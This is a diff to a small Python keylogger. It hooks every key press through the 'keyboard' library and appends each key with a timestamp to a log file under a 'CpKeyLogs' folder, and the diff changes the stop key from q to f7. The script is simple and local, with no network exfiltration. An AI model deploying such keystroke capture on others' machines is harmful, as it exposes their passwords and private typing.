@@ -6,17 +6,18 @@
 import keyboard
 import datetime
 
+#while True:
 ActualDate = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
-file_path = "PressedKeys.txt"
+file_path = "E:/AllCaptured/CpKeyLogs/PressedKeys.txt" # Change it by YOURS Directory
 
 def log_key(e):
     with open(file_path, "a") as file:
         file.write("\n" + ActualDate + " " + "Pressed Key : "+ e.name)
 
-print("Press q for STOP Script")
+print("Press f7 for STOP Script")
 keyboard.hook(log_key)
-keyboard.wait("q")
-if keyboard.is_pressed("q"):
-    print("Pressed q ! Exitting...")
-    with open("PressedKeys.txt", "a") as file:
-        file.write("\n" + ActualDate + " " + "Pressed q ! Exitting...")
+keyboard.wait("f7")
+if keyboard.is_pressed("f7"):
+    print("Pressed f7 ! Exitting...")
+    with open(file_path, "a") as file:
+        file.write("\n"*2 + ActualDate + "\n" + "Pressed f7 ! Exitting...")
